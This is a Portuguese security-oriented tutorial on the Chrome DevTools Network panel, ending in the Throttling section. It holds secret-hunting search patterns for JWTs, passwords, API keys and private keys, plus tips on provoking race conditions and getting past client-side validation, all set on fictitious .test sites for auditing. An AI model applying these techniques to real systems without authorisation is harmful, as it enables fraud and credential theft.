> [⬅️ 1B. Fundamentos Web (1.7 a 1.13)](./01b-fundamentos-web-parte2.md) | [🏠 **Voltar ao Sumário Principal**](../README.md) | [2.2 Chrome DevTools — Aba Application ➡️](./02b-devtools-application.md)

---

<a id="s2"></a>
## 2. Guia Completo do Chrome DevTools

O **Chrome DevTools** (*Chrome Developer Tools* — Ferramentas do Desenvolvedor do Google Chrome) é um conjunto integrado de ferramentas de inspeção, depuração (*debugging*), auditoria de segurança, análise de rede e perfilamento de desempenho (*profiling*) embutido diretamente no navegador Google Chrome e em outros navegadores baseados no projeto **Chromium** (como Microsoft Edge, Brave, Vivaldi e Opera). Para o desenvolvedor web e para o analista de segurança da informação, o DevTools funciona como um laboratório de observação em tempo real do lado do cliente (*client-side*): tudo o que o navegador renderiza no **DOM (Document Object Model — Modelo de Objeto de Documento)**, armazena localmente, executa na máquina virtual JavaScript (**V8**) ou transmite pela rede passa sob a visibilidade dessas ferramentas.

> [!IMPORTANT]
> **O DevTools não é uma barreira de segurança para o servidor.** Todo dado enviado ao navegador (código HTML — *HyperText Markup Language*, folhas de estilo CSS — *Cascading Style Sheets*, scripts JavaScript, respostas JSON — *JavaScript Object Notation*, cabeçalhos HTTP — *Hypertext Transfer Protocol* e cookies não protegidos) está sob controle físico do usuário local. Qualquer validação, ocultação visual de botões ou controle de acesso implementado exclusivamente no front-end pode ser inspecionado, modificado ou contornado pelo DevTools em segundos **[REQUISITO]**.

##### Formas de abertura e atalhos essenciais

O Chrome DevTools pode ser aberto de diversas maneiras, dependendo do foco imediato da análise (inspeção estrutural, console de execução ou tráfego de rede):

| Ação / Objetivo | Atalho (Windows / Linux) | Atalho (macOS) | Caminho pela Interface Gráfica |
|---|---|---|---|
| Abrir o DevTools na última aba utilizada | `F12` ou `Ctrl + Shift + I` | `Cmd + Option + I` | Menu do Chrome (`⋮`) → **Mais ferramentas** (*More tools*) → **Ferramentas do desenvolvedor** (*Developer tools*) |
| Abrir diretamente no painel **Console** | `Ctrl + Shift + J` | `Cmd + Option + J` | Clicar com o botão direito na página → **Inspecionar** (*Inspect*) → aba **Console** |
| Abrir no modo de seleção de elemento (**Elements** / Inspecionar) | `Ctrl + Shift + C` | `Cmd + Option + C` | Clicar com o botão direito sobre o elemento específico → **Inspecionar** (*Inspect*) |
| Abrir o **Command Menu** (Menu de Comandos) | `Ctrl + Shift + P` (com o DevTools aberto) | `Cmd + Shift + P` | Menu de três pontos do DevTools (`⋮`) → **Run command** |
| Abrir as **Configurações** (*Settings*) do DevTools | `F1` ou `?` (com o DevTools em foco) | `F1` ou `?` | Ícone de engrenagem (`⚙`) no canto superior direito do DevTools |
| Alternar a gaveta inferior (**Drawer**) | `Esc` (com o DevTools em foco) | `Esc` | Menu do DevTools (`⋮`) → **More tools** → selecionar ferramenta secundária |

##### Visão geral das abas principais do Chrome DevTools

A barra superior do DevTools agrupa painéis especializados. Embora esta apostila aprofunde os três painéis mais cobrados em provas e auditorias práticas de segurança (**Network**, **Application** e **Console**), é importante compreender o papel de cada aba:

1. **Elements (Elementos)**: exibe e permite editar em tempo real a árvore do **DOM** (não apenas o HTML estático original, mas a estrutura viva após manipulações via JavaScript) e o **CSSOM (CSS Object Model — Modelo de Objeto CSS)**, incluindo estilos computados (*Computed*), modelo de caixa (*Box Model*), *Event Listeners* (ouvintes de eventos) e propriedades de acessibilidade.
2. **Console**: funciona simultaneamente como central de registros (*logs*, avisos, erros de rede, violações de **CSP — Content Security Policy** e erros de **CORS — Cross-Origin Resource Sharing**) e como um terminal **REPL (Read-Eval-Print Loop — Laço de Leitura-Avaliação-Impressão)** interativo que executa JavaScript no contexto da página. Veja a [Seção 2.3 Console](./02c-devtools-console.md#s2-3).
3. **Sources (Fontes)**: exibe os arquivos carregados pela página, permite depurar JavaScript passo a passo com *breakpoints* (pontos de parada), inspecionar a pilha de chamadas (*Call Stack*), observar variáveis em escopo (*Scope*), editar scripts em tempo real, formatar código minificado (**Pretty print** `{}`) e configurar **Local Overrides** (sobrescritas locais de arquivos e cabeçalhos).
4. **Network (Rede)**: intercepta, registra e detalha todas as transações de rede iniciadas pela página (HTTP/1.1, HTTP/2, HTTP/3, WebSockets, Server-Sent Events), exibindo cabeçalhos, payloads, respostas, cookies, tempos de conexão e cadeia de iniciadores. Veja a [Seção 2.1 Network](#s2-1).
5. **Performance (Desempenho)**: grava traços detalhados de execução da thread principal, renderização, pintura (*paint*), uso de CPU (*Central Processing Unit*) e quadros por segundo (FPS — *Frames Per Second*).
6. **Memory (Memória)**: analisa o consumo de memória RAM (*Random Access Memory*) pelo JavaScript e pelo DOM por meio de *Heap Snapshots*, auxiliando a detectar vazamentos de memória (*memory leaks*) ou dados sensíveis retidos em objetos na memória.
7. **Application (Aplicativo)**: inspeciona todos os mecanismos de persistência e estado no navegador (**Cookies**, **Local Storage**, **Session Storage**, **IndexedDB**, **Cache Storage**), além de **Service Workers**, **Web App Manifest**, **Storage Buckets** e isolamento de quadros (**Frames**). Veja a [Seção 2.2 Application](./02b-devtools-application.md#s2-2).
8. **Security (Segurança)** / **Privacy and security** **[Varia por versão]**: resume o estado criptográfico da conexão (validade do certificado X.509, versão do protocolo **TLS — Transport Layer Security**, cifra negociada, presença de *mixed content* — conteúdo misto HTTP em página HTTPS) e controles de privacidade de cookies de terceiros.
9. **Lighthouse**: executa auditorias automatizadas de desempenho, acessibilidade, boas práticas e **SEO (Search Engine Optimization — Otimização para Mecanismos de Busca)**.
10. **Recorder (Gravador)**: grava, reproduz e mede fluxos de interação do usuário na página.

##### Command Menu (`Ctrl+Shift+P`), Settings (`F1`), Drawer (`Esc`) e Idioma da Interface

- **Command Menu (`Ctrl+Shift+P` ou `Cmd+Shift+P`)**: inspirado em editores de código como o Visual Studio Code, permite acionar qualquer funcionalidade ou painel do DevTools digitando seu nome. Por exemplo, digitar `screenshot` permite capturar a tela inteira da página (*Capture full size screenshot*); digitar `disable javascript` desativa imediatamente a execução de scripts para testar se a aplicação possui validação apenas no cliente; digitar `network conditions` abre a aba de condições de rede.
- **Settings (`F1`)**: permite ajustar preferências críticas para análise técnica, como ativar *Disable cache (while DevTools is open)*, habilitar *Log XMLHttpRequests* no Console, ativar ou desativar *JavaScript source maps* e *CSS source maps* (mapas de código-fonte que revelam a estrutura original de projetos TypeScript/React/Webpack quando esquecidos em produção), e definir o idioma da interface.
- **Drawer (`Esc`)**: pressionar a tecla `Esc` dentro de qualquer painel abre uma gaveta inferior dividida em abas secundárias. Isso permite, por exemplo, manter o painel **Network** aberto na parte superior enquanto utiliza o **Console**, **Network conditions**, **Request blocking** ou **Search** na parte inferior simultaneamente.
- **Idioma da interface (Inglês vs. Português)**: **[Varia por versão]** Nas versões modernas do Chrome, o idioma do DevTools pode acompanhar o idioma do navegador ou ser fixado em inglês em `Settings (F1) → Preferences → Language`. Em provas acadêmicas, certificações e documentações técnicas, os termos em **inglês** (*Preserve log*, *Disable cache*, *Initiator*, *Waterfall*, *Payload*, *TTFB*) são amplamente predominantes. Por isso, esta apostila utiliza a nomenclatura oficial em inglês acompanhada de sua tradução ou explicação em português brasileiro **[BOA PRÁTICA]**.

##### Estrutura da Ficha Técnica de 10 Pontos (Padrão da Seção 2)

Para garantir rigor acadêmico e utilidade prática tanto em provas quanto em auditorias reais, cada controle, filtro, coluna e parâmetro detalhado nesta seção é documentado com uma ficha padronizada de **10 tópicos**:

1. **Nome do parâmetro**: nomenclatura oficial no Chrome DevTools (e variações conhecidas entre versões).
2. **O que significa**: definição conceitual e técnica exata do recurso ou indicador.
3. **Para que serve**: finalidade prática para o desenvolvedor, administrador de redes ou auditor de segurança.
4. **Onde encontrar no DevTools**: caminho exato na interface gráfica e atalhos correspondentes.
5. **Exemplo prático**: representação realista de como o item aparece ou é utilizado em uma aplicação de laboratório (`loja-ficticia.test`, `api.exemplo.test`).
6. **Comportamento normal**: o que se espera observar em uma aplicação saudável e bem construída.
7. **O que seria considerado seguro**: critérios objetivos que demonstram conformidade com boas práticas e requisitos de segurança.
8. **O que poderia indicar uma vulnerabilidade**: sinais de alerta (*red flags*), anomalias ou más configurações visíveis naquele parâmetro.
9. **Como investigar o problema**: roteiro passo a passo de diagnóstico utilizando recursos combinados do próprio DevTools.
10. **Como corrigir ou prevenir**: medidas técnicas de remediação no código, servidor web ou arquitetura, classificadas com **[REQUISITO]**, **[RECOMENDAÇÃO]** ou **[BOA PRÁTICA]**.

---

<a id="s2-1"></a>
### 2.1 Network

O painel **Network** (Rede) é a ferramenta primária do Chrome DevTools para inspecionar a comunicação entre o navegador (cliente) e os servidores web ou APIs (*Application Programming Interfaces* — Interfaces de Programação de Aplicações). Do ponto de vista de arquitetura web e segurança, o painel Network atua como um *sniffer* (analisador de tráfego) na camada de aplicação do próprio navegador: como ele opera dentro do processo do navegador antes da criptografia de envio e logo após a descriptografia de recebimento, ele permite visualizar em texto claro todo o tráfego **HTTPS (HTTP over TLS)** sem a necessidade de instalar certificados de *proxy* externos.

<a id="s2-1-1"></a>
#### 2.1.1 Visão geral da interface da aba Network

Quando aberta, a interface da aba **Network** divide-se horizontalmente em cinco áreas funcionais (e uma sexta área lateral quando uma requisição é selecionada):

```text
+-----------------------------------------------------------------------------------+
| [●] [🚫] | [🔍 Filter] [🔎 Search] | [x] Preserve log [x] Disable cache [No throt.]| <- 1. Barra de Controles
+-----------------------------------------------------------------------------------+
| [Filter input...        ] [ ] Invert [ ] Hide data URLs | All | Fetch/XHR | Doc...| <- 2. Barra de Filtros
+-----------------------------------------------------------------------------------+
| [          Overview / Timeline (Gráfico temporal de carregamento)               ] | <- 3. Overview (opcional)
+-----------------------------------------------------------------------------------+
| Name          | Status | Type  | Initiator | Size   | Time  | Waterfall           | <- 4. Tabela de Requisições
|---------------|--------|-------|-----------|--------|-------|---------------------|
| login         | 200    | fetch | auth.js:12| 1.2 kB | 84 ms |   [===]             |
| perfil.json   | 200    | fetch | app.js:45 | 4.8 kB | 42 ms |       [==]          |
+-----------------------------------------------------------------------------------+
| 24 requests | 312 kB transferred | 890 kB resources | Finish: 1.4s | Load: 920ms  | <- 6. Rodapé de Estatísticas
+-----------------------------------------------------------------------------------+
```

1. **Barra de Controles (*Action Bar* / Barra Superior)**: reúne botões de controle da gravação (*Record*, *Clear*), alternadores das barras de filtro e busca, opções de persistência (*Preserve log*), desativação de cache (*Disable cache*), simulação de velocidade de rede (*Throttling*), condições extras de rede (*More network conditions*), importação/exportação de arquivos **HAR (HTTP Archive)** e configurações visuais do painel.
2. **Barra de Filtros (*Filter Bar*)**: contém a caixa de texto para expressões de filtragem (suportando operadores avançados como `status-code:403`, `method:POST`, `-domain:cdn.exemplo.test`), caixas de seleção de exclusão (*Invert*, *Hide data URLs*, *Hide extension URLs*), pílulas de categoria de recurso (**All**, **Fetch/XHR**, **Doc**, **CSS**, **JS**, **Font**, **Img**, **Media**, **Manifest**, **WS**, **Wasm**, **Other**) e filtros rápidos de segurança/privacidade (**Blocked response cookies**, **Blocked requests**, **3rd-party requests**).
3. **Overview / Timeline (Visão Geral Temporal)**: gráfico horizontal superior (ocultável nas configurações da aba) que mostra uma linha do tempo em milissegundos de todas as requisições disparadas em paralelo, além de marcadores verticais para os eventos `DOMContentLoaded` (linha azul) e `Load` (linha vermelha). Permite arrastar o mouse para selecionar um intervalo de tempo específico (ex.: observar apenas as requisições que ocorreram entre `200 ms` e `650 ms`).
4. **Tabela de Requisições (*Requests Table*)**: lista cronológica de cada recurso solicitado desde que o painel Network começou a gravar. Cada linha representa uma transação (ou tentativa de transação) e cada coluna exibe um atributo técnico (como `Name`, `Status`, `Method`, `Protocol`, `Scheme`, `Domain`, `Remote Address`, `Type`, `Initiator`, `Size`, `Time` e `Waterfall`).
5. **Painel de Detalhes da Requisição (*Request Details Pane*)**: aparece à direita (ou abaixo) quando o usuário clica sobre uma linha da tabela de requisições. Contém as sub-abas de inspeção profunda: **Headers**, **Payload**, **Preview**, **Response**, **Initiator**, **Timing**, **Cookies**, **EventStream** e **Messages** (detalhadas na subseção `2.1.5`).
6. **Rodapé de Estatísticas (*Summary Toolbar*)**: barra inferior fixa que resume os indicadores globais do lote de requisições visível:
   - **`requests` (ex.: `18 / 42 requests`)**: número de requisições exibidas pelos filtros atuais em relação ao total capturado.
   - **`transferred` (ex.: `240 kB / 1.1 MB transferred`)**: volume real de bytes que trafegou pela rede (já comprimido via `gzip`, `br` — Brotli — ou `zstd`, incluindo cabeçalhos HTTP).
   - **`resources` (ex.: `680 kB / 3.4 MB resources`)**: tamanho real dos recursos após a descompressão pelo navegador.
   - **`Finish` (ex.: `Finish: 2.34 s`)**: tempo decorrido desde o início da navegação até o encerramento da última requisição HTTP registrada (Nota: se a página mantiver um WebSocket aberto ou fizer *polling* contínuo, o valor de `Finish` continuará subindo indefinidamente).
   - **`DOMContentLoaded` (ex.: `DOMContentLoaded: 410 ms`)**: instante em que o documento HTML principal foi inteiramente baixado e analisado (*parsed*), e os scripts síncronos/diferidos (`defer`) foram executados, sem aguardar o término do download de folhas de estilo tardias, imagens ou *frames*.
   - **`Load` (ex.: `Load: 980 ms`)**: instante em que a página e todos os seus sub-recursos dependentes (imagens, CSS, scripts, fontes) terminaram de carregar completamente (disparo do evento `window.onload`).

---

<a id="s2-1-2"></a>
#### 2.1.2 Controles da barra superior

A barra superior da aba **Network** governa como o DevTools captura, preserva, simula e exporta o tráfego de rede. Abaixo, cada controle é analisado individualmente com a ficha técnica de 10 pontos.

##### Record network log

- **Nome do parâmetro**: **Record network log** / **Stop recording network log** (Gravar registro de rede — atalho `Ctrl + E` no Windows/Linux ou `Cmd + E` no macOS).
- **O que significa**: é o botão circular no canto superior esquerdo do painel Network. Quando está **vermelho** (ativo), o DevTools intercepta e registra todas as requisições de rede da aba; quando está **cinza** (inativo), novas requisições ocorrem normalmente na página, mas não são adicionadas à tabela.
- **Para que serve**: iniciar ou pausar a captura de pacotes HTTP/WebSocket para isolar uma ação específica do usuário (como clicar no botão "Finalizar Compra" sem poluir a tabela com chamadas de telemetria posteriores).
- **Onde encontrar no DevTools**: painel **Network** → primeiro ícone à esquerda na barra superior (círculo vermelho/cinza).
- **Exemplo prático**: em uma página que dispara requisições de *heartbeat* (`GET /api/ping`) a cada 2 segundos, o analista clica em **Submit** no formulário de login e, assim que a resposta `POST /api/login` chega, pressiona `Ctrl + E` para congelar a tabela e analisar os dados com calma.
- **Comportamento normal**: inicia automaticamente ativado (vermelho) sempre que o painel Network é aberto. Se a tabela estiver vazia, o DevTools sugere recarregar a página (`Ctrl + R`) para capturar o carregamento inicial.
- **O que seria considerado seguro**: é um controle local de observação do navegador; seu uso não altera a segurança da aplicação, mas permite isolar evidências durante uma auditoria.
- **O que poderia indicar uma vulnerabilidade**: se, mesmo com o usuário sem interagir com a página e com a gravação ativa, surgirem dezenas de requisições para domínios desconhecidos (ex.: `https://tracker-malicioso.test/collect`), pode haver um script de terceiros comprometido (**Magecart / Supply Chain XSS**) exfiltrando dados em segundo plano.
- **Como investigar o problema**: deixe o **Record network log** ativo por 60 segundos sem tocar no mouse ou teclado; ordene as requisições surgidas e verifique a coluna **Initiator** para identificar qual arquivo JavaScript disparou o tráfego silencioso.
- **Como corrigir ou prevenir**: auditar dependências externas, aplicar **SRI (Subresource Integrity — Integridade de Sub-recursos)** em scripts de CDNs (**[RECOMENDAÇÃO]**) e restringir domínios de destino com a diretiva `connect-src` da **CSP (Content Security Policy)** (**[RECOMENDAÇÃO]**).

##### Clear network log

- **Nome do parâmetro**: **Clear network log** (Limpar registro de rede — ícone `🚫` de círculo cortado; atalho `Ctrl + L` em algumas versões).
- **O que significa**: comando que apaga imediatamente todas as linhas registradas na tabela da aba Network até aquele momento.
- **Para que serve**: descartar o ruído das centenas de imagens, fontes e scripts do carregamento inicial da página antes de executar um teste pontual (por exemplo, testar apenas a requisição disparada ao alterar a senha do usuário).
- **Onde encontrar no DevTools**: painel **Network** → segundo ícone à esquerda na barra superior (ao lado do botão *Record*).
- **Exemplo prático**:
  1. Você carrega `https://loja-ficticia.test/minha-conta` (que gera 65 requisições de ativos estáticos).
  2. Clica em **Clear network log** (`🚫`), deixando a tabela com `0 requests`.
  3. Clica no botão "Alterar E-mail" na página.
  4. Agora a tabela mostra exclusivamente a requisição `PATCH https://api.loja-ficticia.test/v1/usuarios/42`.
- **Comportamento normal**: esvazia instantaneamente a tabela e zera os contadores do rodapé, mantendo a gravação ativa para os próximos eventos.
- **O que seria considerado seguro**: ferramenta de organização da análise; não afeta o estado da aplicação nem apaga cookies ou sessões do navegador.
- **O que poderia indicar uma vulnerabilidade**: um erro operacional comum de iniciantes é esquecer que o navegador (ou um script da página) pode limpar ou redirecionar rapidamente o fluxo se **Preserve log** estiver desmarcado, fazendo com que uma requisição vulnerável desapareça antes de ser lida.
- **Como investigar o problema**: combine o uso do **Clear network log** antes do teste com a ativação do checkbox **Preserve log** para garantir que nada após o clique seja perdido caso ocorra um redirecionamento (`302 Found`) ou recarregamento da página.
- **Como corrigir ou prevenir**: adotar como procedimento padrão de auditoria limpar o log imediatamente antes do envio de formulários sensíveis e manter **Preserve log** ativo **[BOA PRÁTICA]**.

##### Filter (ícone de funil)

- **Nome do parâmetro**: **Filter** (Alternador da barra de filtros — ícone de funil).
- **O que significa**: botão que exibe ou oculta a segunda barra horizontal do painel Network (a **Barra de Filtros**).
- **Para que serve**: economizar espaço vertical em telas pequenas ou revelar a caixa de filtro e os botões de tipo de recurso (`Fetch/XHR`, `Doc`, `JS`, etc.). Quando há algum filtro ativo e a barra de filtros é ocultada, o ícone de funil muda de cor (geralmente vermelho ou azul, conforme o tema) para alertar que parte das requisições está oculta.
- **Onde encontrar no DevTools**: painel **Network** → barra superior, terceiro ícone à esquerda (formato de funil).
- **Exemplo prático**: um estudante abre o painel Network, recarrega a página, vê no rodapé `1 / 58 requests` e acha que o site não carregou imagens nem scripts. Ao olhar para o ícone de funil colorido e clicar nele, descobre que o filtro `Doc` ou um texto antigo na caixa `Filter` estava ativo.
- **Comportamento normal**: permanece ativado (azul) por padrão, exibindo a barra de filtros logo abaixo da barra de controles.
- **O que seria considerado seguro**: manter a barra de filtros visível durante análises de segurança para evitar falsos negativos causados por filtros esquecidos.
- **O que poderia indicar uma vulnerabilidade**: não indica vulnerabilidade no sistema analisado, mas ocultar a barra com filtros ativos pode mascarar requisições maliciosas (como um *beacon* enviado via imagem `Img` ou `WS` enquanto o analista filtra apenas por `Fetch/XHR`).
- **Como investigar o problema**: confira sempre o rodapé (`X / Y requests`). Se `X` for menor que `Y`, clique no ícone **Filter** (funil), selecione **All** e limpe a caixa de texto de filtragem.
- **Como corrigir ou prevenir**: verificar o contador `X / Y requests` no rodapé antes de concluir qualquer diagnóstico de rede **[BOA PRÁTICA]**.

##### Search (lupa / `Ctrl+F`)

- **Nome do parâmetro**: **Search** (Pesquisar em todas as requisições — ícone de lupa `🔎` ou atalho `Ctrl + F` / `Cmd + F` com o painel Network em foco).
- **O que significa**: ferramenta de busca textual ou por expressão regular (*RegExp*) que vasculha **simultaneamente** as URLs, os cabeçalhos de requisição (*Request Headers*), os cabeçalhos de resposta (*Response Headers*) e o corpo das respostas (*Response bodies*) de todas as transações capturadas.
- **Para que serve**: localizar onde um determinado dado (como um token **JWT — JSON Web Token**, um número de CPF, uma chave de API `AIza...`, um cabeçalho `Set-Cookie` ou uma mensagem de erro de banco de dados) apareceu, sem precisar clicar manualmente em dezenas de requisições uma por uma.
- **Onde encontrar no DevTools**: painel **Network** → ícone de lupa (`🔎`) na barra superior ou pressionando `Ctrl + F` (`Cmd + F`). Abre um painel lateral ou inferior de busca com opções `Match case` (`Aa` — diferenciar maiúsculas/minúsculas) e `Use regular expression` (`.*` — usar expressão regular).
- **Exemplo prático**: durante uma auditoria em `https://loja-ficticia.test`, você quer saber se algum endpoint está vazando o CPF do cliente (`123.456.789-00`) ou retornando hashes de senha (`$2b$12$`). Você pressiona `Ctrl + F` na aba Network, digita `$2b$` e o painel **Search** aponta exatamente a linha `48` do JSON retornado por `GET /api/v1/comentarios`, revelando uma vulnerabilidade de exposição excessiva de dados (*Excessive Data Exposure*).
- **Comportamento normal**: exibe uma árvore agrupada por requisição e mostra o trecho exato (cabeçalho ou linha do corpo da resposta) onde o termo pesquisado foi encontrado; ao clicar no resultado, o DevTools abre diretamente a aba correspondente (`Headers` ou `Response`) na linha destacada.
- **O que seria considerado seguro**: buscas por senhas digitadas pelo usuário, hashes criptográficos (`$2a$`, `$2b$`, `$argon2id$`), chaves privadas (`BEGIN PRIVATE KEY`), segredos internos ou *stack traces* (`at Object.<anonymous>`, `SQLSTATE`, `Traceback`) não devem retornar ocorrências nas respostas recebidas pelo cliente.
- **O que poderia indicar uma vulnerabilidade**: encontrar a senha em texto claro refletida no corpo da resposta ou na URL, encontrar tokens de outros usuários em listagens públicas ou localizar cadeias de conexão de banco de dados em respostas de erro `500`.
- **Como investigar o problema**: ative `Use regular expression` (`.*`) na busca do Network e pesquise padrões sensíveis, como `eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+` (estrutura de um JWT em Base64URL) ou `(password|senha|secret|api_key)` para mapear todos os pontos de tráfego de credenciais.
- **Como corrigir ou prevenir**: filtrar dados no back-end utilizando **DTOs (Data Transfer Objects — Objetos de Transferência de Dados)** ou serializadores explícitos para nunca enviar campos internos na resposta HTTP **[REQUISITO]**.

##### Preserve log

- **Nome do parâmetro**: **Preserve log** (Preservar registro entre navegações).
- **O que significa**: caixa de seleção (*checkbox*) que impede o Chrome DevTools de apagar a tabela de requisições quando a página atual é recarregada, navega para outra URL ou sofre um redirecionamento HTTP (`301`, `302`, `303`, `307`, `308`) ou via JavaScript (`window.location.href = ...`).
- **Para que serve**: capturar fluxos completos de múltiplas etapas — especialmente **login**, **logout**, **OAuth 2.0 / OpenID Connect (OIDC)**, **SAML (Security Assertion Markup Language)**, pagamentos e redirecionamentos — nos quais a requisição crítica ocorre imediatamente antes da mudança de página.
- **Onde encontrar no DevTools**: painel **Network** → barra superior, checkbox **Preserve log**.
- **Exemplo prático**: ao submeter um formulário de login em `https://loja-ficticia.test/login`, o servidor responde ao `POST /autenticar` com `302 Found`, `Set-Cookie: sid=9f8a...; HttpOnly; Secure` e `Location: /painel`. Se **Preserve log** estiver **desmarcado**, o navegador limpa a tabela assim que carrega `/painel`, e você **não consegue ver** a requisição `POST /autenticar` nem o cabeçalho `Set-Cookie` que definiu a sessão! Com **Preserve log** **marcado**, a requisição `POST /autenticar` permanece registrada no topo da lista.
- **Comportamento normal**: vem desmarcado por padrão ao abrir o navegador pela primeira vez (para evitar consumo excessivo de memória em navegações longas), mas deve ser marcado sempre que se analisa autenticação ou redirecionamentos.
- **O que seria considerado seguro**: em fluxos preservados com **Preserve log**, observar que credenciais são enviadas via `POST` sobre HTTPS, que tokens de autorização em fluxos OAuth 2.0 utilizam **PKCE (Proof Key for Code Exchange)** (RFC 7636) e que redirecionamentos após login regeneram o identificador de sessão.
- **O que poderia indicar uma vulnerabilidade**:
  1. **Open Redirect (Redirecionamento Aberto)**: observar uma cadeia `302` redirecionando o usuário para um domínio externo arbitrário passado em `?redirect=https://site-falso.test`.
  2. **Session Fixation (Fixação de Sessão)**: comparar o cookie enviado *antes* do `POST /login` com o cookie usado *depois* do redirecionamento e notar que o ID de sessão não mudou.
  3. **Vazamento de Token via `Referer`**: notar que uma URL com `?reset_token=abc123` carregou scripts de terceiros ou redirecionou para domínio externo enviando a URL completa no cabeçalho `Referer`.
- **Como investigar o problema**: marque **Preserve log**, limpe o log (`🚫`), execute todo o fluxo de login/redirecionamento do início ao fim e examine a sequência cronológica de respostas `3xx` e `200`, comparando os cabeçalhos `Location`, `Set-Cookie` e `Referer`.
- **Como corrigir ou prevenir**: validar destinos de redirecionamento contra uma lista de permissões (*allowlist*) no servidor (**[REQUISITO]**), regenerar o ID de sessão a cada mudança de nível de privilégio (**[REQUISITO]**) e configurar `Referrer-Policy: strict-origin-when-cross-origin` ou `no-referrer` em páginas com tokens na URL (**[RECOMENDAÇÃO]**).

##### Disable cache

- **Nome do parâmetro**: **Disable cache** (Desativar cache enquanto o DevTools estiver aberto).
- **O que significa**: caixa de seleção que instrui o navegador a ignorar completamente o cache local (tanto o **Memory Cache** quanto o **Disk Cache**) para todas as requisições feitas pela aba, forçando o navegador a buscar cada recurso diretamente na rede.
- **Para que serve**: garantir que o desenvolvedor ou analista de segurança veja exatamente a resposta atual do servidor (incluindo os cabeçalhos HTTP completos e o código-fonte atualizado), sem interferência de respostas antigas armazenadas localmente ou respostas condicionais `304 Not Modified`.
- **Onde encontrar no DevTools**: painel **Network** → barra superior, checkbox **Disable cache** (também acessível em `Settings (F1) → Preferences → Network → Disable cache (while DevTools is open)`).
- **Exemplo prático**: quando **Disable cache** está **marcado**, o Chrome adiciona ou modifica automaticamente os cabeçalhos de requisição para `Cache-Control: no-cache` e `Pragma: no-cache`, e **não envia** cabeçalhos de validação condicional como `If-None-Match` (baseado em `ETag`) nem `If-Modified-Since`. Assim, o servidor devolve `200 OK` com o arquivo completo em vez de `304 Not Modified`.
- **Comportamento normal**: só tem efeito **enquanto a janela do DevTools estiver aberta**. Assim que o DevTools é fechado, o cache do navegador volta a funcionar normalmente.
- **O que seria considerado seguro**:
  - Para **testar headers de segurança e atualizações**: manter **Disable cache** marcado para ver os cabeçalhos reais do servidor.
  - Para **auditar vulnerabilidades de cache**: **desmarcar** **Disable cache** em uma segunda rodada de testes para verificar se dados confidenciais do usuário (como `GET /api/extrato-bancario`) estão sendo salvos indevidamente no `(disk cache)` após o logout!
- **O que poderia indicar uma vulnerabilidade**: quando você **desmarca** **Disable cache**, faz login, acessa `/api/meus-dados-pessoais`, faz logout e, ao navegar de volta ou repetir a requisição, vê na coluna `Size` a indicação `(disk cache)` ou `(memory cache)` exibindo dados privados sem consultar o servidor (causado pela ausência de `Cache-Control: no-store` na resposta original).
- **Como investigar o problema**:
  1. Com **Disable cache** marcado, carregue a página autenticada e verifique na aba **Headers** se a resposta contém `Cache-Control: no-store`.
  2. Desmarque **Disable cache**, recarregue a página e observe na coluna **Size** da tabela de requisições quais endpoints foram servidos a partir de `(disk cache)` ou `(memory cache)`.
- **Como corrigir ou prevenir**: respostas que contenham dados pessoais (**PII — Personally Identifiable Information**), tokens ou informações financeiras devem incluir `Cache-Control: no-store, private` **[REQUISITO]**. Veja a [Seção 1.13 Cache do Navegador](./01a-fundamentos-web-parte1.md#s1) e [Headers de Segurança](./05-headers-de-seguranca.md#s5).

##### Throttling (Limitação de largura de banda e latência)

- **Nome do parâmetro**: **Throttling** (Estrangulamento/Simulação de condições de rede — menu suspenso que exibe por padrão `No throttling`).
- **O que significa**: emulador de camada de rede embutido no DevTools que restringe artificialmente a taxa de download (*throughput* de descida), a taxa de upload (*throughput* de subida) e adiciona uma latência mínima (**RTT — Round-Trip Time**, tempo de ida e volta) às requisições da aba, ou desconecta completamente a aba da rede (**Offline**).
- **Para que serve**:
  1. Testar o desempenho e a resiliência da aplicação em conexões móveis lentas ou instáveis.
  2. Testar o comportamento de **Service Workers** e páginas *offline* (**PWA — Progressive Web App**).
  3. **Em segurança e testes de qualidade**: desacelerar o tráfego para observar estados intermediários da interface (ex.: botões de pagamento que não são desabilitados durante o envio da requisição, permitindo duplo clique ou **Race Conditions — Condições de Corrida**).
- **Onde encontrar no DevTools**: painel **Network** → barra superior, menu suspenso onde se lê **No throttling** (ao lado de *Disable cache*). Também disponível na aba secundária **Network conditions**.
- **Exemplo prático**:
  Perfis disponíveis no menu suspenso **[Varia por versão]** (em versões recentes do Chrome, os antigos rótulos `Fast 3G` / `Slow 3G` foram atualizados para refletir redes modernas):
  - **No throttling**: velocidade real da sua interface de rede local.
  - **Fast 4G**: simula uma rede 4G rápida (ex.: latência ~20–60 ms, download ~9 Mbps).
  - **Slow 4G**: simula uma rede 4G congestionada (ex.: latência ~150 ms, download ~1.6 Mbps).
  - **3G**: simula uma conexão móvel legada de alta latência (ex.: latência ~300–560 ms, download ~400–750 kbps).
  - **Offline**: bloqueia 100% do acesso à rede para aquela aba (`net::ERR_INTERNET_DISCONNECTED`), exceto o que for interceptado e respondido localmente por um **Service Worker**.
  - **Custom → Add...**: permite criar um perfil personalizado (ex.: `Latência: 2000 ms`, `Download: 500 kbit/s`, `Upload: 500 kbit/s`) para observar requisições em câmera lenta.
- **Comportamento normal**: quando qualquer perfil diferente de `No throttling` está ativo, um ícone de alerta amarelo (`⚠️`) aparece na aba **Network** para lembrar o desenvolvedor de que a rede está artificialmente limitada.
- **O que seria considerado seguro**: ao simular **3G** ou um perfil com `2000 ms` de latência e clicar rapidamente 5 vezes no botão "Resgatar Cupom" ou "Transferir R$ 100,00", a interface deve desabilitar o botão no primeiro clique (**[BOA PRÁTICA]**) e o servidor deve processar a operação de forma atômica ou com chave de idempotência (`Idempotency-Key`), impedindo resgates duplicados (**[REQUISITO]**).
- **O que poderia indicar uma vulnerabilidade**:
  1. **Race Condition (Condição de Corrida / TOCTOU — Time-of-Check to Time-of-Use)**: sob latência elevada, múltiplos cliques disparam várias requisições `POST /api/transferir` simultâneas antes que a primeira resposta chegue, sacando mais saldo do que o existente na conta.
  2. **Exposição de interface antes da verificação de autorização**: em Single-Page Applications (**SPA**), a página renderiza o painel administrativo por 2 segundos enquanto a requisição `GET /api/verificar-admin` está lenta no **3G**, revelando a estrutura interna antes de redirecionar.
- **Como investigar o problema**: crie um perfil **Custom** com `Latency: 1500 ms`, clique repetidamente em ações sensíveis de escrita (`POST`, `PUT`, `DELETE`) e observe na tabela do Network se múltiplas requisições idênticas foram enviadas e se mais de uma retornou `200 OK` ou `201 Created`.
